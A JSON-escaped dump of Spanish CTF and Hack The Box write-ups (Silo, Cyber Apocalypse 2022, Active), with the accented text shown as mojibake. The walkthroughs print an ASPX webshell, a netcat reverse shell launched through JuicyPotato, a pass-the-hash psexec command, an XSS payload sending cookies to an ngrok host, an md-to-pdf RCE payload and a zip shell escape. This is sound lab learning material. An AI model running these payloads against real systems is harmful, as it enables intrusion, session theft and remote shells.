method=\u0026#34;post\u0026#34; runat=\u0026#34;server\u0026#34;\u0026gt;\u0026lt;asp:TextBox id=\u0026#34;txtArg\u0026#34; runat=\u0026#34;server\u0026#34; Width=\u0026#34;250px\u0026#34;\u0026gt;\u0026lt;/asp:TextBox\u0026gt;\u0026lt;asp:Button id=\u0026#34;testing\u0026#34; runat=\u0026#34;server\u0026#34; Text=\u0026#34;excute\u0026#34; OnClick=\u0026#34;cmdExe_Click\u0026#34;\u0026gt;\u0026lt;/asp:Button\u0026gt;\u0026lt;asp:Label id=\u0026#34;lblText\u0026#34; runat=\u0026#34;server\u0026#34;\u0026gt;Command:\u0026lt;/asp:Label\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/HTML\u0026gt; Post Explotaci√≥n Enumeraci√≥n Se identific√≥ que entre los privilegios disponibles del usuario obtenido se encuentra habilitado SeImpersonatePrivilege lo que lleva a un camino de escalaci√≥n de privilegios por medio de Rotten o JuicyPotato.\nSe identific√≥ un archivo accesible en el escritorio de uno de los usuarios del sistema c:\\users\\phineas\\desktop\\oracle issue.txt el cual indica que se trata de un dumpeo de memoria del sistema.\nContenido:\nSupport vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested): Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0 link password: ¬£%Hm8646uC$ Nota: Cabe recalcar que el caracter ¬£ puede que no se interprete correctamente si se opt√≥ por entablar una reverse shell, causando su omisi√≥n y por consiguiente, que a la hora de la descarga indique que la contrase√±a no es v√°lida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existi√≥ este problema\nEscalaci√≥n de privilegios M√©todo 1 - Juicy Potato Habiendo encontrado los privilegios relacionados con este m√©todo de escalaci√≥n, s√≥lo restar√≠a probar su ejecuci√≥n mediante el binario y con las opciones utilizadas para entablar una reverse shell con permisos elevados NT AUTHORITY\\SYSTEM. Ejecutando:\n.\\jp.exe -t * -l 1337 -p c:\\windows\\temp\\nc.exe -a \u0026#34; -e cmd.exe 10.10.14.16 4321\u0026#34; Con lo que respecta a los argumentos utilizados, el binario mismo da la descripci√≥n de cada uno de ellos.\nCon lo que respecta a la pr√°ctica los argumentos -t y -l no representa algo sustancial el cambiar valores. Y en donde -p (programa a ejecutar) y -a (argumentos a utilizar por el programa se√±alado) se usaron a partir de las herramientas usadas en pasos anteriores.\nM√©todo 2 - Memdump Con la copia de memoria descargada, se puede hacer uso de volatility para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de:\n./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo Teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil m√°s adecuado.\nEjecutando systeminfo en la m√°quina se pueden comparar resultados, identificando el perfil Win2012R2x64 como el m√°s adecuado.\nHaciendo uso del plugin hashdump se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la m√°quina como el usuario Administrator. Por medio de:\n./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump Obteniendo acceso haciendo uso del hash con:\nimpacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7 Referencias  Hack Tricks - Pentesting Oracle TNS Listener. odat.py. 0xdf Write-up. Ippsec Walkthrough. PayloadAllTheThings - JuicyPotato. Binarios Juicy Potato. Releases Volatility. Github Volatility.  ","permalink":"https://srrequiem.xyz/posts/htb-silo/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Silo   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores egre55    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Silo"},{"content":"Intro El CTF de Cyber Apocalypse volvi√≥ este a√±o, bajo una tem√°tica intergal√°ctica estando disponible del 14 al 20 de Mayo del 2022. Mediante este enlace se puede obtener m√°s informaci√≥n del evento.\nAqu√≠ se encuentran las soluciones de los retos que pude resolver durante mi participaci√≥n.\nEl write-up aqu√≠ presente fue generado por medio de CTFScrapper para la creaci√≥n de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en mi compendio de retos.\nRetos Web Kryptos Support Stats    Attribute Info     Difficulty easy   Description The secret vault used by the Longhir\u0026rsquo;s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?   File -    Soluci√≥n Despu√©s de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizar√° los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.\nHaciendo uso del payload:\n\u0026lt;img src=\u0026#34;\u0026#34; onerror=fetch(\u0026#34;https://a748-189-203-27-57.ngrok.io/\u0026#34;+document.cookie).then() /\u0026gt; Con la intenci√≥n de robar una cookie de sesi√≥n correspondiente a la del admin, como lo menciona el sitio.\nDe acuerdo a como est√° construida la cookie, se identific√≥ que se trata de un JWT.\nAl buscar m√°s informaci√≥n siendo que con la cookie de sesi√≥n no revela ning√∫n cambio al utilizarla se identific√≥ en el c√≥digo fuente de http://\u0026lt;challenge url\u0026gt;/login se revela un directorio disponible haciendo uso de la cookie obtenida.\nlogin.js\nVista de http://\u0026lt;challenge url\u0026gt;/tickets haciendo uso de la cookie obtenida.\nVista de http://\u0026lt;challenge url\u0026gt;/settings haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contrase√±a del \u0026ldquo;usuario logueado\u0026rdquo;.\nAl visualizar el c√≥digo se puede identificar que el par√°metro uid es enviado al hacer uso de la funcionalidad.\nBuscando invocar la funcionalidad haciendo uso de curl se envi√≥ el uid del moderador como prueba.\ncurl -v http://13868188223:30914/api/users/update -X POST -H \u0026quot;Content-Type: application/json\u0026quot; -d '{\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;,\u0026quot;uid\u0026quot;:100}' --cookie \u0026quot;session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA\u0026quot;\nHabi√©ndo mencionado que se env√≠a el uid en la petici√≥n, se decidi√≥ cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.\nAl haber sido satisfactorio el cambio de contrase√±a se puede realizar el login como admin, obteniendo de esta manera la bandera.\n Flag: HTB{x55_4nd_id0rs_ar3_fun!!}\n BlinkerFluids Stats    Attribute Info     Difficulty easy   Description Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids‚Ñ¢ Corp. Ulysses has infiltrated this supplier organization\u0026rsquo;s one of the HR department tools and needs your help to get into their server. Can you help him?   File web_blinkerfluids.zip    Soluci√≥n Despu√©s de identificar la composici√≥n del c√≥digo se encontr√≥ que:\n La bandera se encontraba en /flag.txt. Una librer√≠a empleada es vulnerable a RCE (md-to-pdf). Por la configuaci√≥n de la aplicaci√≥n, s√≥lo se permit√≠a la obtenci√≥n de archivos en el directorio /static/invoices/.  Al capturar el contenido enviado se utiliz√≥ el payload ---js\\n((require(\\\u0026quot;child_process\\\u0026quot;))execSync(\\\u0026quot;cp /flag.txt /static/invoices/flag.txt\\\u0026quot;))\\n---RCE como cuerpo del archivo markdown.\nEjecutando as√≠ el payload y permitiendo navegar a donde se encuentra la bandera\n Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}\n Pwn Space Pirate: Entrypoint Stats    Attribute Info     Difficulty easy   Description D12 is one of Golden Fang\u0026rsquo;s missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.   File pwn_sp_entrypoint.zip    Soluci√≥n Con los archivos que disponibles se prob√≥ localmente el binario y a modo de prueba y error, se identific√≥ que al hacer uso de la contrase√±a 1234 el binario lee los contenidos del archivo local flag.txt.\n1 Scan card üí≥ 2 Insert password ‚Ü™Ô∏è \u0026gt; 2 [*] Insert password: 1234 [+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_4_t35t1ng} [-] Invalid option! Intruder detected! üö® üö® Por lo que de la misma manera se realiz√≥ el mismo proceso en la conexi√≥n remota disponible.\n1 Scan card üí≥ 2 Insert password ‚Ü™Ô∏è \u0026gt; 2 [*] Insert password: 1234 [+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!} [-] Invalid option! Intruder detected! üö® üö®  Flag: HTB{th3_g4t35_4r3_0p3n!}\n Reversing WIDE Stats    Attribute Info     Difficulty easy   Description We\u0026rsquo;ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You\u0026rsquo;ve managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?   File rev_wide.zip    Soluci√≥n Despu√©s de interactuar con el binario y ver las posibilidades ofrecidas, la opci√≥n que se visualiza como cifrada pide una contrase√±a para visualizar su contenido.\nBuscando el valor en duro mediante su ejecuci√≥n en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contrase√±a.\nObteniendo el valor: sup3rs3cr3tw1d3.\nY al pasarse como contrase√±a, se obtuvo la bandera.\n Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}\n Forensics Puppeteer Stats    Attribute Info     Difficulty easy   Description Planet Longhir is known for it\u0026rsquo;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation\u0026rsquo;s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite\u0026rsquo;s location was leaked since it is a top-sercret that only Galactic Federation\u0026rsquo;s council is aware of. Help her analyse the Council\u0026rsquo;s HQ event logs and solve this mystery.   File forensics_puppeteer.zip    Soluci√≥n Se uso como base la soluci√≥n de un reto similar que anteriormente HackTheBox hab√≠a publicado, que fue encontrado al buscar como realizar an√°lisis a los tipos de archivos dados.\nAl revisar el mismo archivo indicado en el writeup (Microsoft-Windows-PowerShell%4Operationalevtx), que por suerte, tambi√©n existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripci√≥n del reto (contexto del evento).\nEn uno de ellos se encuentra algo que por su composici√≥n se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el c√≥digo concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con 0xd1\n Declaraci√≥n de stages Concatenaci√≥n XOR a cada elemento  Se imprimi√≥ esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de esta receta de CyberChef.\nModificaci√≥n a script original:\nEjecuci√≥n:\nDecodeo de valores obtenidos para obtener bandera:\n Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}\n Golden Persistence Stats    Attribute Info     Difficulty easy   Description Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir\u0026rsquo;s space station and escalate their privileges, they will soon be able to activate the station\u0026rsquo;s defence mechanisms that are able to prevent any spaceship from entering Urkir\u0026rsquo;s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.   File forensics_golden_persistence.zip    Soluci√≥n Despu√©s de investigar acerca del an√°lisis del archivo dado (NTUSER.dat), se encontr√≥ este write-up en el que se hace uso de diferentes herramientas para an√°lizar y navegar entre los registros del archivo, del cu√°l en el registro /Software/Microsoft/Windows/CurrentVersion/Run se identific√≥ el uso de powershell con un par√°metro poco convencional. Haciendo uso de reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT.\nDespu√©s de identificar que el par√°metro se encontraba codificado en base64 y desencode√°ndolo, se puede visualizar el script utilizado.\nDe acuerdo al c√≥digo, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.\nExtrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.\nAl ejecutar la reconstrucci√≥n del script, a√∫n presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecuci√≥n correcta qued√≥ de la siguiente manera\nScript completo function encr { param( [Byte[]]$data, [Byte[]]$key ) [Byte[]]$buffer = New-Object Byte[] $data.Length $data.CopyTo($buffer, 0) [Byte[]]$s = New-Object Byte[] 256; [Byte[]]$k = New-Object Byte[] 256; for ($i = 0; $i -lt 256; $i++) { $s[$i] = [Byte]$i; $k[$i] = $key[$i % $key.Length]; } $j = 0; for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; } $i = $j = 0; for ($x = 0; $x -lt $buffer.Length; $x++) { $i = ($i + 1) % 256; $j = ($j + $s[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; [int]$t = ($s[$i] + $s[$j]) % 256; $buffer[$x] = $buffer[$x] -bxor $s[$t]; } return $buffer } function HexToBin { param( [Parameter( Position=0, Mandatory=$true, ValueFromPipeline=$true) ] [string]$s) $return = @() for ($i = 0; $i -lt $s.Length ; $i += 2) { $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber) } Write-Output $return } $enc = [System.Text.Encoding]::ASCII [Byte[]]$key = $enc.GetBytes(\u0026#34;Q0mmpr4B5rvZi3pS\u0026#34;) #$encrypted1 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL #$encrypted2 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\BjqAtIen).uLltjjW #$encrypted3 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\AppDataLow\\t03A1Stq).uY4S39Da #$encrypted4 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\Google\\Nv50zeG).Kb19fyhl #$encrypted5 = (Get-ItemProperty -Path HKCU:\\AppEvents\\Jx66ZG0O).jH54NW8C $encrypted1 = \u0026#34;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\u0026#34; $encrypted2 = \u0026#34;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\u0026#34; $encrypted3 = \u0026#34;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\u0026#34; $encrypted4 = \u0026#34;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\u0026#34; $encrypted5 = \u0026#34;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\u0026#34; $encrypted = \u0026#34;$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\u0026#34; [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString #$DecryptedString|iex Del cu√°l al ejecutarse se obtiene el valor original del par√°metro ejecutado, encontrando de esta manera la bandera.\n Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}\n Misc Compressor Stats    Attribute Info     Difficulty easy   Description Ramona\u0026rsquo;s obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang\u0026rsquo;s ownership called \u0026ldquo;Compressor\u0026rdquo;, which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?   File -    Soluci√≥n Para este reto se expon√≠a una conexi√≥n a un host en donde se ofrec√≠an diferentes opciones para interactuar con el binario disponible.\nDe acuerdo a la interacci√≥n se encontraron 2 formas de resolver el reto, mediante un Path traversal haciendo uso de la ejecuci√≥n de cat disponible.\n‚îî‚îÄ$ nc 138.68.183.64 31076 [*] Directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S Component List: +===============+ | | | 1. Head ü§ñ | | 2. Torso ü¶¥ | | 3. Hands üí™ | | 4. Legs ü¶µ | | | +===============+ [*] Choose component: 1 [*] Sub-directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 3 Insert name you want to read: ../../flag.txt HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5} Y tambi√©n por medio de la utilidad expuesta de zip se encuentra un GTFOBin el cu√°l permite la invocaci√≥n de una shell.\nActions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 4 Insert \u0026lt;name\u0026gt;.zip: Insert \u0026lt;name\u0026gt;: /etc/passwd Insert \u0026lt;options\u0026gt;: -T -TT \u0026#39;sh #\u0026#39; adding: etc/passwd (deflated 62%) ls -la total 12 drwxr-sr-x 2 ctf ctf 4096 May 18 23:01 . drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 .. -rw------- 1 ctf ctf 650 May 18 23:01 zikfJpfK cd .. ls -la total 24 drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 . drwxr-sr-x 1 ctf ctf 4096 May 18 23:00 .. drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Hands drwxr-sr-x 2 ctf ctf 4096 May 18 23:01 Head drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Legs drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Torso cd .. ls -la total 44 drwxr-sr-x 1 ctf ctf 4096 May 18 23:00 . drwxr-xr-x 1 root root 4096 Mar 3 15:18 .. drwxr-sr-x 6 ctf ctf 4096 May 18 22:57 5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21 -rwxrwxr-x 1 root root 3166 May 12 23:51 artifacts.py -rw-rw-r-- 1 root root 263 May 12 23:32 clear.py -rw-rw-r-- 1 root root 38 May 12 17:37 flag.txt drwxr-sr-x 6 ctf ctf 4096 May 18 22:55 kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl drwxr-sr-x 6 ctf ctf 4096 May 18 22:54 kWHPODHQFKSletaDKHB2AgJslbm6fwbb drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 tHV1tdX82QcPllglF8wa6AhU24FRZS4S drwxr-sr-x 6 ctf ctf 4096 May 18 22:55 wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI  FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}\n Composici√≥n Como parte del ejercicio \u0026ldquo;post-reto\u0026rdquo; se extrajo el c√≥digo correspondiente al reto (artifacts.py y clear.py).\nartifacts.py #!/usr/bin/python3 import os, random from termcolor import colored whitelist = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.\u0026#39;#/ \u0026#34; PATH = \u0026#34;./\u0026#34; sub_array = [\u0026#34;Head\u0026#34;, \u0026#34;Torso\u0026#34;, \u0026#34;Hands\u0026#34;, \u0026#34;Legs\u0026#34;] # Create random directory def rand_dirname(length=32): charset = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; dirname = \u0026#34;\u0026#34; while len(dirname) \u0026lt; length: dirname += random.choice(charset) return dirname def check_filename(filename): return all(i in whitelist for i in filename) def change_sub_dir(idx, color): print(colored(f\u0026#34;\\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\\n\u0026#34;, color)) os.chdir(PATH + sub_array[idx]) def subjects(): subs = \u0026#34;\u0026#34;\u0026#34;\\nComponent List: +===============+ | | | 1. Head ü§ñ | | 2. Torso ü¶¥ | | 3. Hands üí™ | | 4. Legs ü¶µ | | | +===============+ \u0026#34;\u0026#34;\u0026#34; print(colored(subs, \u0026#34;magenta\u0026#34;)) ans = int(input(colored(\u0026#34;[*] Choose component: \u0026#34;, \u0026#34;magenta\u0026#34;))) if ans == 1: change_sub_dir(0, \u0026#34;blue\u0026#34;) elif ans == 2: change_sub_dir(1, \u0026#34;green\u0026#34;) elif ans == 3: change_sub_dir(2, \u0026#34;cyan\u0026#34;) elif ans == 4: change_sub_dir(3, \u0026#34;yellow\u0026#34;) else: print(colored(\u0026#34;\\n[-] Invalid option!\\n\u0026#34;, \u0026#34;red\u0026#34;)) exit() def menu(): m = \u0026#34;\u0026#34;\u0026#34; Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit \u0026#34;\u0026#34;\u0026#34; print(colored(m, \u0026#34;yellow\u0026#34;)) return int(input(colored(\u0026#34;[*] Choose action: \u0026#34;, \u0026#34;yellow\u0026#34;))) def create_file(): fname = input(colored(\u0026#34;Insert name: \u0026#34;, \u0026#34;yellow\u0026#34;)).strip() if not check_filename(fname): print(colored(\u0026#34;\\n[-] Invalid name!\\n\u0026#34;, \u0026#34;red\u0026#34;)) exit() os.system(f\u0026#34;touch {fname}\u0026#34;) contents = input(colored(\u0026#34;\\nInsert content: \u0026#34;, \u0026#34;yellow\u0026#34;)) f = open(fname, \u0026#34;a\u0026#34;) f.write(contents) f.close() print(\u0026#34;\\n\u0026#34;) print(colored(f\u0026#34;[+] Artifact [{fname}] was created successfuly!\u0026#34;, \u0026#34;green\u0026#34;)) def zip(): zip_name = input(colored(\u0026#34;Insert \u0026lt;name\u0026gt;.zip: \u0026#34;, \u0026#34;blue\u0026#34;)).strip() files = input(colored(\u0026#34;Insert \u0026lt;name\u0026gt;: \u0026#34;, \u0026#34;blue\u0026#34;)).strip() options = input(colored(\u0026#34;Insert \u0026lt;options\u0026gt;: \u0026#34;, \u0026#34;blue\u0026#34;)).strip() if not check_filename(zip_name) or not check_filename(files) or not check_filename(options): print(colored(\u0026#34;\\n[-] Invalid name!\\n\u0026#34;, \u0026#34;red\u0026#34;)) exit() os.system(f\u0026#34;zip {zip_name}.zip {files}{options}\u0026#34;) # Create directory dirname = rand_dirname() print(colored(f\u0026#34;\\n[*] Directory to work in: {dirname}\u0026#34;, \u0026#34;cyan\u0026#34;)) os.mkdir(PATH + dirname) os.chdir(PATH + dirname) os.system(\u0026#34;mkdir -p Head Torso Hands Legs\u0026#34;) ans = subjects() while True: # Choose action act = menu() print(\u0026#34;\\n\u0026#34;) if act == 1: create_file() elif act == 4: zip() elif act == 3: fname = input(\u0026#34;Insert name you want to read: \u0026#34;).strip() os.system(f\u0026#34;cat ./{fname}\u0026#34;) elif act == 2: os.system(\u0026#34;pwd; ls -la\u0026#34;) elif act == 6: os.system(\u0026#34;rm -rf ./*\u0026#34;) elif act == 5: os.chdir(f\u0026#34;../../{dirname}\u0026#34;) ans = subjects() else: print(colored(\u0026#34;\\n[-] Invalid option!\\n\u0026#34;, \u0026#34;red\u0026#34;)) os.system(\u0026#34;rm -rf ./*\u0026#34;) exit() clear.py import os os.system(\u0026#39;ls -la \u0026gt; temp\u0026#39;) f = open(\u0026#39;temp\u0026#39;, \u0026#39;r\u0026#39;) for line in f: arr = line.split() try: if len(arr[8]) \u0026gt; 16: os.system(f\u0026#39;rm -rf {arr[8]}\u0026#39;) except: print(\u0026#39;\u0026#39;) print(f\u0026#39;[+] Directories have been deleted!\\n\u0026#39;) os.system(\u0026#39;rm -f ./temp\u0026#39;) Conclusi√≥n En lo personal encontr√© el CTF bastante divertido y me permiti√≥ explorar cosas que hasta el momento no hab√≠a podido tocar como lo fueron los retos de forense, enfocados m√°s al lado de Blue Team. Como ejercicio para pr√°ctica futura y de aprendizaje guard√© los retos y sus archivos en este repositorio para poder resolverlos siguiendo los write-ups p√∫blicos y aprender de ellos.\n","permalink":"https://srrequiem.xyz/posts/htb-cyber-apocalypse-2022/","summary":"Intro El CTF de Cyber Apocalypse volvi√≥ este a√±o, bajo una tem√°tica intergal√°ctica estando disponible del 14 al 20 de Mayo del 2022. Mediante este enlace se puede obtener m√°s informaci√≥n del evento.\nAqu√≠ se encuentran las soluciones de los retos que pude resolver durante mi participaci√≥n.\nEl write-up aqu√≠ presente fue generado por medio de CTFScrapper para la creaci√≥n de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en mi compendio de retos.","title":"HTB Cyber Apocalypse 2022"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Active   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores eks \u0026amp; mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ‚ùØ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:29 EST Initiating Connect Scan at 20:29 Scanning 10.10.10.100 [65535 ports] Discovered open port 135/tcp on 10.10.10.100 Discovered open port 445/tcp on 10.10.10.100 Discovered open port 53/tcp on 10.10.10.100 Discovered open port 139/tcp on 10.10.10.100 Discovered open port 49152/tcp on 10.10.10.100 Discovered open port 464/tcp on 10.10.10.100 Discovered open port 49157/tcp on 10.10.10.100 Discovered open port 593/tcp on 10.10.10.100 Discovered open port 3269/tcp on 10.10.10.100 Discovered open port 49165/tcp on 10.10.10.100 Discovered open port 88/tcp on 10.10.10.100 Discovered open port 49167/tcp on 10.10.10.100 Discovered open port 3268/tcp on 10.10.10.100 Discovered open port 389/tcp on 10.10.10.100 Warning: 10.10.10.100 giving up on port because retransmission cap hit (2). Discovered open port 49155/tcp on 10.10.10.100 Discovered open port 636/tcp on 10.10.10.100 Discovered open port 49158/tcp on 10.10.10.100 Discovered open port 49154/tcp on 10.10.10.100 Discovered open port 5722/tcp on 10.10.10.100 Discovered open port 49153/tcp on 10.10.10.100 Discovered open port 49166/tcp on 10.10.10.100 Discovered open port 9389/tcp on 10.10.10.100 Completed Connect Scan at 20:29, 28.58s elapsed (65535 total ports) Nmap scan report for 10.10.10.100 Host is up, received user-set (0.065s latency). Scanned at 2022-01-19 20:29:16 EST for 29s Not shown: 63369 closed tcp ports (conn-refused), 2144 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack 88/tcp open kerberos-sec syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 389/tcp open ldap syn-ack 445/tcp open microsoft-ds syn-ack 464/tcp open kpasswd5 syn-ack 593/tcp open http-rpc-epmap syn-ack 636/tcp open ldapssl syn-ack 3268/tcp open globalcatLDAP syn-ack 3269/tcp open globalcatLDAPssl syn-ack 5722/tcp open msdfsr syn-ack 9389/tcp open adws syn-ack 49152/tcp open unknown syn-ack 49153/tcp open unknown syn-ack 49154/tcp open unknown syn-ack 49155/tcp open unknown syn-ack 49157/tcp open unknown syn-ack 49158/tcp open unknown syn-ack 49165/tcp open unknown syn-ack 49166/tcp open unknown syn-ack 49167/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds Escaneo espec√≠fico ‚ùØ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49166,49167 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:30 EST Nmap scan report for 10.10.10.100 Host is up (0.066s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open 